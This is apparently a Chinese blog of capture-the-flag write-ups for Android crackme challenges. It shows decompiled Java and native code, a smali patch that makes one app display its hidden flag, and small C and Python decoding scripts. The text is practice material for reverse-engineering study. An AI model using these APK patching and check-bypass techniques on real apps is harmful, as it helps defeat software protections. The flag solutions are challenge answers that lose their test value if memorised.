<p>程序流程, 输入flag</p>
<p>jd-gui反编译如下:</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">public void onGoClick(View paramView)</span><br><span class="line"> &#123;</span><br><span class="line">   paramView &#x3D; this.etFlag.getText().toString();</span><br><span class="line">   if (getSecret(getFlag()).equals(getSecret(encrypt(paramView)))) &#123;</span><br><span class="line">     Toast.makeText(this, &quot;Success&quot;, 1).show();</span><br><span class="line">   &#125;</span><br><span class="line">   for (;;)</span><br><span class="line">   &#123;</span><br><span class="line">     return;</span><br><span class="line">     Toast.makeText(this, &quot;Failed&quot;, 1).show();</span><br><span class="line">   &#125;</span><br><span class="line"> &#125;</span><br></pre></td></tr></table></figure>

<p>getFlag函数与encrypt函数是native层</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">static</span><br><span class="line">&#123;</span><br><span class="line">  System.loadLibrary(&quot;phcm&quot;);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">public native String encrypt(String paramString);</span><br><span class="line"></span><br><span class="line">public native String getFlag();</span><br></pre></td></tr></table></figure>



<p>反编译libphcm.so文件</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">int __cdecl Java_com_ph0en1x_android_1crackme_MainActivity_encrypt(JNIEnv *a1, int a2, int a3)</span><br><span class="line">&#123;</span><br><span class="line">  size_t i; &#x2F;&#x2F; esi</span><br><span class="line">  const char *s; &#x2F;&#x2F; edi</span><br><span class="line"></span><br><span class="line">  i &#x3D; 0;</span><br><span class="line">  for ( s &#x3D; (*a1)-&gt;GetStringUTFChars(a1, (jstring)a3, 0); i &lt; strlen(s); --s[i++] )</span><br><span class="line">    ;</span><br><span class="line">  return (*a1)-&gt;NewStringUTF(a1, s);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>以上加密就是对字符串中的每个字符-1</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br></pre></td><td class="code"><pre><span class="line">int __cdecl Java_com_ph0en1x_android_1crackme_MainActivity_getFlag(JNIEnv *a1)</span><br><span class="line">&#123;</span><br><span class="line">  signed int v1; &#x2F;&#x2F; esi</span><br><span class="line">  char *v2; &#x2F;&#x2F; edi</span><br><span class="line">  char v3; &#x2F;&#x2F; al</span><br><span class="line">  int result; &#x2F;&#x2F; eax</span><br><span class="line">  int v5; &#x2F;&#x2F; [esp+26h] [ebp-46h]</span><br><span class="line">  int v6; &#x2F;&#x2F; [esp+2Ah] [ebp-42h]</span><br><span class="line">  int v7; &#x2F;&#x2F; [esp+2Eh] [ebp-3Eh]</span><br><span class="line">  __int16 v8; &#x2F;&#x2F; [esp+32h] [ebp-3Ah]</span><br><span class="line">  int v9; &#x2F;&#x2F; [esp+34h] [ebp-38h]</span><br><span class="line">  int v10; &#x2F;&#x2F; [esp+38h] [ebp-34h]</span><br><span class="line">  int v11; &#x2F;&#x2F; [esp+3Ch] [ebp-30h]</span><br><span class="line">  int v12; &#x2F;&#x2F; [esp+40h] [ebp-2Ch]</span><br><span class="line">  int v13; &#x2F;&#x2F; [esp+44h] [ebp-28h]</span><br><span class="line">  int v14; &#x2F;&#x2F; [esp+48h] [ebp-24h]</span><br><span class="line">  int v15; &#x2F;&#x2F; [esp+4Ch] [ebp-20h]</span><br><span class="line">  int v16; &#x2F;&#x2F; [esp+50h] [ebp-1Ch]</span><br><span class="line">  int v17; &#x2F;&#x2F; [esp+54h] [ebp-18h]</span><br><span class="line">  int v18; &#x2F;&#x2F; [esp+58h] [ebp-14h]</span><br><span class="line">  unsigned int v19; &#x2F;&#x2F; [esp+5Ch] [ebp-10h]</span><br><span class="line"></span><br><span class="line">  v1 &#x3D; 38;</span><br><span class="line">  v2 &#x3D; (char *)&amp;v18 + 2;</span><br><span class="line">  v9 &#x3D; 1279407662;</span><br><span class="line">  v10 &#x3D; 987807583;</span><br><span class="line">  v19 &#x3D; __readgsdword(0x14u);</span><br><span class="line">  v11 &#x3D; 1663091624;</span><br><span class="line">  v12 &#x3D; 482391945;</span><br><span class="line">  v13 &#x3D; 683820061;</span><br><span class="line">  v14 &#x3D; 235072895;</span><br><span class="line">  v15 &#x3D; 2559534685;</span><br><span class="line">  v16 &#x3D; 382777269;</span><br><span class="line">  v17 &#x3D; 4227367757;</span><br><span class="line">  v18 &#x3D; 4670209;</span><br><span class="line">  v5 &#x3D; 1819043144;</span><br><span class="line">  v6 &#x3D; 1750081647;</span><br><span class="line">  v7 &#x3D; 829318448;</span><br><span class="line">  v8 &#x3D; 120;</span><br><span class="line">  do</span><br><span class="line">  &#123;</span><br><span class="line">    v3 &#x3D; *v2--;</span><br><span class="line">    v2[1] &#x3D; (*((_BYTE *)&amp;v5 + v1-- % 13) ^ (v3 + 1 - *v2)) - 1;</span><br><span class="line">  &#125;</span><br><span class="line">  while ( v1 );</span><br><span class="line">  LOBYTE(v9) &#x3D; (v9 ^ 0x48) - 1;</span><br><span class="line">  result &#x3D; (int)(*a1)-&gt;NewStringUTF(a1, (const char *)&amp;v9);</span><br><span class="line">  if ( __readgsdword(0x14u) !&#x3D; v19 )</span><br><span class="line">    sub_4B0();</span><br><span class="line">  return result;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>这个加密稍微有点复杂. 若想获取flag, 先对上面这给逆出来, 在对encrypt加密加密函数给再逆出来即可获得flag, 但是, 我写了一个c脚本, 上面这个有问题, 主要是LOBYTE(v9) = (v9 ^ 0x48) - 1;这个语句不好写.换另一种思路.动态调试(瞎弄半天, 啥也没弄出来), 再换另一种, 就是使用Android killer修改smali源码, 将其getFlag函数的字符串给打印出来, 只需将打印失败逻辑添加一下getFlag函数, 将getFlag字符串覆盖为打印失败的字符串, 复制上面调用getFlag的即可, 再更变一下变量, 如下</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">.line 37</span><br><span class="line">   :cond_0</span><br><span class="line">   const-string v1, &quot;Failed&quot;</span><br><span class="line">   </span><br><span class="line">   invoke-virtual &#123;p0&#125;, Lcom&#x2F;ph0en1x&#x2F;android_crackme&#x2F;MainActivity;-&gt;getFlag()Ljava&#x2F;lang&#x2F;String;</span><br><span class="line"></span><br><span class="line">   move-result-object v1   &#x2F;&#x2F; getFlag()函数的返回值,(字符串)</span><br><span class="line">   </span><br><span class="line">   invoke-static &#123;p0, v1, v3&#125;, Landroid&#x2F;widget&#x2F;Toast;-&gt;makeText(Landroid&#x2F;content&#x2F;Context;Ljava&#x2F;lang&#x2F;CharSequence;I)Landroid&#x2F;widget&#x2F;Toast;</span><br><span class="line"></span><br><span class="line">   move-result-object v1</span><br><span class="line"></span><br><span class="line">   invoke-virtual &#123;v1&#125;, Landroid&#x2F;widget&#x2F;Toast;-&gt;show()V</span><br></pre></td></tr></table></figure>

<p>然后点击Android-&gt;编译, 即可再次编译为apk文件, 安装再nox中运行, 随便输入就会出现ek<code>fz@q2^x/t^fn0mF^6/^rb</code>qanqntfg^E`hq|</p>
<p>再次让每个字符+1就可得到flag</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">#include &lt;stdio.h&gt;</span><br><span class="line">#include &lt;string.h&gt;</span><br><span class="line"></span><br><span class="line">int main(void) &#123;</span><br><span class="line">	char flag[] &#x3D; &quot;ek&#96;fz@q2^x&#x2F;t^fn0mF^6&#x2F;^rb&#96;qanqntfg^E&#96;hq|&quot;;</span><br><span class="line">	for(int i &#x3D; 0; i &lt; strlen(flag); ++i) &#123;</span><br><span class="line">		putchar(++flag[i]);</span><br><span class="line">	&#125;</span><br><span class="line"></span><br><span class="line">	return 0;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>



<h1 id="app1"><a href="#app1" class="headerlink" title="app1"></a>app1</h1><p><a target="_blank" rel="noopener" href="https://adworld.xctf.org.cn/media/task/attachments/b9af8dfef6b749d2819ef5be16c26a0d.apk">下载</a></p>
<p>来源:攻防世界</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br></pre></td><td class="code"><pre><span class="line">public void onClick(View paramView)</span><br><span class="line"> &#123;</span><br><span class="line">   for (;;)</span><br><span class="line">   &#123;</span><br><span class="line">     try</span><br><span class="line">     &#123;</span><br><span class="line">       str &#x3D; this.this$0.text.getText().toString();</span><br><span class="line">       PackageInfo localPackageInfo &#x3D; this.this$0.getPackageManager().getPackageInfo(&quot;com.example.yaphetshan.tencentgreat&quot;, 16384);</span><br><span class="line">       paramView &#x3D; localPackageInfo.versionName;</span><br><span class="line">       int i &#x3D; localPackageInfo.versionCode;</span><br><span class="line">       j &#x3D; 0;</span><br><span class="line">       if ((j &gt;&#x3D; str.length()) || (j &gt;&#x3D; paramView.length())) &#123;</span><br><span class="line">         continue;</span><br><span class="line">       &#125;</span><br><span class="line">       if (str.charAt(j) !&#x3D; (paramView.charAt(j) ^ i))</span><br><span class="line">       &#123;</span><br><span class="line">         Toast.makeText(this.this$0, &quot;再接再励~&quot;, 1).show();</span><br><span class="line">         return;</span><br><span class="line">       &#125;</span><br><span class="line">     &#125;</span><br><span class="line">     catch (PackageManager.NameNotFoundException paramView)</span><br><span class="line">     &#123;</span><br><span class="line">       String str;</span><br><span class="line">       int j;</span><br><span class="line">       Toast.makeText(this.this$0, &quot;不要玩小聪明&quot;, 1).show();</span><br><span class="line">       continue;</span><br><span class="line">     &#125;</span><br><span class="line">     j++;</span><br><span class="line">     continue;</span><br><span class="line">     if (str.length() !&#x3D; paramView.length()) &#123;</span><br><span class="line">       continue;</span><br><span class="line">     &#125;</span><br><span class="line">     Toast.makeText(this.this$0, &quot;恭喜开启芝麻之门&quot;, 1).show();</span><br><span class="line">   &#125;</span><br><span class="line"> &#125;</span><br></pre></td></tr></table></figure>



<p>在BuildConfig class中找到versionName和versionCode</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">package com.example.yaphetshan.tencentgreat;</span><br><span class="line"></span><br><span class="line">public final class BuildConfig</span><br><span class="line">&#123;</span><br><span class="line">  public static final String APPLICATION_ID &#x3D; &quot;com.example.yaphetshan.tencentgreat&quot;;</span><br><span class="line">  public static final String BUILD_TYPE &#x3D; &quot;debug&quot;;</span><br><span class="line">  public static final boolean DEBUG &#x3D; Boolean.parseBoolean(&quot;true&quot;);</span><br><span class="line">  public static final String FLAVOR &#x3D; &quot;&quot;;</span><br><span class="line">  public static final int VERSION_CODE &#x3D; 15;</span><br><span class="line">  public static final String VERSION_NAME &#x3D; &quot;X&lt;cP[?PHNB&lt;P?aj&quot;;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<p>解密脚本</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">#include &lt;stdio.h&gt;</span><br><span class="line">#include &lt;string.h&gt;</span><br><span class="line">int main(void) &#123;</span><br><span class="line">	char name[] &#x3D; &quot;X&lt;cP[?PHNB&lt;P?aj&quot;;</span><br><span class="line">	for(int i &#x3D; 0; i &lt; strlen(name); ++i)</span><br><span class="line">		putchar(name[i] ^15);</span><br><span class="line"></span><br><span class="line">	return 0;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure>





<h1 id="easyjni"><a href="#easyjni" class="headerlink" title="easyjni"></a>easyjni</h1><p><a target="_blank" rel="noopener" href="https://adworld.xctf.org.cn/media/task/attachments/eb760e6a10ea4dcab700a6b7db948488.apk">下载</a></p>
<p>来源:攻防世界</p>
<p>反编译java如下:</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line">class MainActivity$1</span><br><span class="line">  implements View.OnClickListener</span><br><span class="line">&#123;</span><br><span class="line">  MainActivity$1(MainActivity paramMainActivity, Context paramContext) &#123;&#125;</span><br><span class="line">  </span><br><span class="line">  public void onClick(View paramView)</span><br><span class="line">  &#123;</span><br><span class="line">    paramView &#x3D; (EditText)((MainActivity)this.a).findViewById(2131427445);</span><br><span class="line">    if (MainActivity.a(this.b, paramView.getText().toString())) &#123;</span><br><span class="line">      Toast.makeText(this.a, &quot;You are right!&quot;, 1).show();</span><br><span class="line">    &#125;</span><br><span class="line">    for (;;)</span><br><span class="line">    &#123;</span><br><span class="line">      return;</span><br><span class="line">      Toast.makeText(this.a, &quot;You are wrong! Bye~&quot;, 1).show();</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>



<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><span class="line">public class MainActivity</span><br><span class="line">  extends c</span><br><span class="line">&#123;</span><br><span class="line">  static</span><br><span class="line">  &#123;</span><br><span class="line">    System.loadLibrary(&quot;native&quot;);</span><br><span class="line">  &#125;</span><br><span class="line">  </span><br><span class="line">  private boolean a(String paramString)</span><br><span class="line">  &#123;</span><br><span class="line">    try</span><br><span class="line">    &#123;</span><br><span class="line">      a locala &#x3D; new com&#x2F;a&#x2F;easyjni&#x2F;a;</span><br><span class="line">      locala.&lt;init&gt;();</span><br><span class="line">      bool &#x3D; ncheck(locala.a(paramString.getBytes()));</span><br><span class="line">      return bool;</span><br><span class="line">    &#125;</span><br><span class="line">    catch (Exception paramString)</span><br><span class="line">    &#123;</span><br><span class="line">      for (;;)</span><br><span class="line">      &#123;</span><br><span class="line">        boolean bool &#x3D; false;</span><br><span class="line">      &#125;</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">  </span><br><span class="line">  private native boolean ncheck(String paramString);</span><br></pre></td></tr></table></figure>



<p>从以上代码可以看到, 对输入的数据先进行base64加密, 然后调用native层的ncheck函数判断是否正确.</p>
<p>ida打开libnative.so文件, 反编译ncheck函数如下:</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br></pre></td><td class="code"><pre><span class="line">signed int __fastcall Java_com_a_easyjni_MainActivity_ncheck(JNIEnv *a1, int a2, int a3)</span><br><span class="line">&#123;</span><br><span class="line">  int v3; &#x2F;&#x2F; r8</span><br><span class="line">  JNIEnv *v4; &#x2F;&#x2F; r5</span><br><span class="line">  int v5; &#x2F;&#x2F; r8</span><br><span class="line">  const char *str; &#x2F;&#x2F; r6</span><br><span class="line">  int i; &#x2F;&#x2F; r0</span><br><span class="line">  char *v8; &#x2F;&#x2F; r2</span><br><span class="line">  char v9; &#x2F;&#x2F; r1</span><br><span class="line">  int v10; &#x2F;&#x2F; r0</span><br><span class="line">  bool v11; &#x2F;&#x2F; nf</span><br><span class="line">  unsigned __int8 v12; &#x2F;&#x2F; vf</span><br><span class="line">  int v13; &#x2F;&#x2F; r1</span><br><span class="line">  signed int result; &#x2F;&#x2F; r0</span><br><span class="line">  char en_str[32]; &#x2F;&#x2F; [sp+3h] [bp-35h]</span><br><span class="line">  char v16; &#x2F;&#x2F; [sp+23h] [bp-15h]</span><br><span class="line">  int v17; &#x2F;&#x2F; [sp+28h] [bp-10h]</span><br><span class="line"></span><br><span class="line">  v17 &#x3D; v3;</span><br><span class="line">  v4 &#x3D; a1;</span><br><span class="line">  v5 &#x3D; a3;</span><br><span class="line">  str &#x3D; (const char *)((int (__fastcall *)(JNIEnv *, int, _DWORD))(*a1)-&gt;GetStringUTFChars)(a1, a3, 0);</span><br><span class="line">  if ( strlen(str) &#x3D;&#x3D; 32 )</span><br><span class="line">  &#123;</span><br><span class="line">    i &#x3D; 0;</span><br><span class="line">    do</span><br><span class="line">    &#123;</span><br><span class="line">      v8 &#x3D; &amp;en_str[i];</span><br><span class="line">      en_str[i] &#x3D; str[i + 16];</span><br><span class="line">      v9 &#x3D; str[i++];</span><br><span class="line">      v8[16] &#x3D; v9;</span><br><span class="line">    &#125;</span><br><span class="line">    while ( i !&#x3D; 16 );</span><br><span class="line">    ((void (__fastcall *)(JNIEnv *, int, const char *))(*v4)-&gt;ReleaseStringUTFChars)(v4, v5, str);</span><br><span class="line">    v10 &#x3D; 0;</span><br><span class="line">    do</span><br><span class="line">    &#123;</span><br><span class="line">      v12 &#x3D; __OFSUB__(v10, 30);</span><br><span class="line">      v11 &#x3D; v10 - 30 &lt; 0;</span><br><span class="line">      v16 &#x3D; en_str[v10];</span><br><span class="line">      en_str[v10] &#x3D; en_str[v10 + 1];</span><br><span class="line">      en_str[v10 + 1] &#x3D; v16;</span><br><span class="line">      v10 +&#x3D; 2;</span><br><span class="line">    &#125;</span><br><span class="line">    while ( v11 ^ v12 );</span><br><span class="line">    v13 &#x3D; memcmp(en_str, &quot;MbT3sQgX039i3g&#x3D;&#x3D;AQOoMQFPskB1Bsc7&quot;, 0x20u);</span><br><span class="line">    result &#x3D; 0;</span><br><span class="line">    if ( !v13 )</span><br><span class="line">      result &#x3D; 1;</span><br><span class="line">  &#125;</span><br><span class="line">  else</span><br><span class="line">  &#123;</span><br><span class="line">    ((void (__fastcall *)(JNIEnv *, int, const char *))(*v4)-&gt;ReleaseStringUTFChars)(v4, v5, str);</span><br><span class="line">    result &#x3D; 0;</span><br><span class="line">  &#125;</span><br><span class="line">  return result;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>以上代码经过了两次加密, 先进行str[i]与str[i + 16]的交换, 再进行str[i]与str[i + 1]进行交换.</p>
<p>解密脚本如下:</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><span class="line">#include &lt;stdio.h&gt;</span><br><span class="line">void decode() &#123;</span><br><span class="line">        char code[] &#x3D; &quot;MbT3sQgX039i3g&#x3D;&#x3D;AQOoMQFPskB1Bsc7&quot;;</span><br><span class="line">        for(int i &#x3D; 0; i &lt; 32;  i +&#x3D; 2) &#123;</span><br><span class="line">                char ch &#x3D; code[i];</span><br><span class="line">                code[i] &#x3D; code[i + 1];</span><br><span class="line">                code[i + 1] &#x3D; ch;</span><br><span class="line">        &#125;</span><br><span class="line">        &#x2F;&#x2F;printf(&quot;%s&quot;, code);</span><br><span class="line">        for(int i &#x3D; 0; i &lt; 16; i ++) &#123;</span><br><span class="line">                char ch &#x3D; code[i];</span><br><span class="line">                code[i] &#x3D; code[i + 16];</span><br><span class="line">                code[i + 16] &#x3D; ch;</span><br><span class="line">        &#125;</span><br><span class="line">        printf(&quot;%s&quot;, code);</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line">void show_arr() &#123;</span><br><span class="line">        char arr[] &#x3D; &#123; 105, 53, 106, 76, 87, 55, 83, 48, 71, 88, 54, 117, 102, 49, 99, 118, 51, 110, 121, 52, 113, 56, 101, 115, 50, 81, 43, 98, 100, 107, 89, 103, 75, 79, 73, 84, 47, 116, 65, 120, 85, 114, 70, 108, 86, 80, 122, 104, 109, 111, 119, 57, 66, 72, 67, 77, 68, 112, 69, 97, 74, 82, 90, 78, 0 &#125;;</span><br><span class="line">        printf(&quot;%s\n&quot;, arr);</span><br><span class="line">&#125;</span><br><span class="line">int main(void) &#123;</span><br><span class="line">        show_arr();</span><br><span class="line">        decode();</span><br><span class="line">        return 0;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>解密base64</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">import base64</span><br><span class="line">import string</span><br><span class="line"></span><br><span class="line">str1 &#x3D; &quot;QAoOQMPFks1BsB7cbM3TQsXg30i9g3&#x3D;&#x3D;&quot;</span><br><span class="line"></span><br><span class="line">string1 &#x3D; &quot;i5jLW7S0GX6uf1cv3ny4q8es2Q+bdkYgKOIT&#x2F;tAxUrFlVPzhmow9BHCMDpEaJRZN&quot;</span><br><span class="line">string2 &#x3D; &quot;ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+&#x2F;&quot;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">print (b&#39;code: &#39; + base64.b64decode(str1.translate(str.maketrans(string1,string2))))</span><br></pre></td></tr></table></figure>





<h1 id="easy-apk"><a href="#easy-apk" class="headerlink" title="easy apk"></a>easy apk</h1><p><a target="_blank" rel="noopener" href="https://adworld.xctf.org.cn/media/task/attachments/989ca07c3f90426fa05406e4369901ff.apk">下载</a></p>
<p>来源: 攻防世界</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line">class MainActivity$1</span><br><span class="line">  implements View.OnClickListener</span><br><span class="line">&#123;</span><br><span class="line">  MainActivity$1(MainActivity paramMainActivity) &#123;&#125;</span><br><span class="line">  </span><br><span class="line">  public void onClick(View paramView)</span><br><span class="line">  &#123;</span><br><span class="line">    paramView &#x3D; ((EditText)this.this$0.findViewById(2131427445)).getText().toString();</span><br><span class="line">    if (new Base64New().Base64Encode(paramView.getBytes()).equals(&quot;5rFf7E2K6rqN7Hpiyush7E6S5fJg6rsi5NBf6NGT5rs&#x3D;&quot;)) &#123;</span><br><span class="line">      Toast.makeText(this.this$0, &quot;验证通过!&quot;, 1).show();</span><br><span class="line">    &#125;</span><br><span class="line">    for (;;)</span><br><span class="line">    &#123;</span><br><span class="line">      return;</span><br><span class="line">      Toast.makeText(this.this$0, &quot;验证失败!&quot;, 1).show();</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<p>base64加密如下</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br></pre></td><td class="code"><pre><span class="line">public class Base64New</span><br><span class="line">&#123;</span><br><span class="line">  private static final char[] Base64ByteToStr &#x3D; &#123; 118, 119, 120, 114, 115, 116, 117, 111, 112, 113, 51, 52, 53, 54, 55, 65, 66, 67, 68, 69, 70, 71, 72, 73, 74, 121, 122, 48, 49, 50, 80, 81, 82, 83, 84, 75, 76, 77, 78, 79, 90, 97, 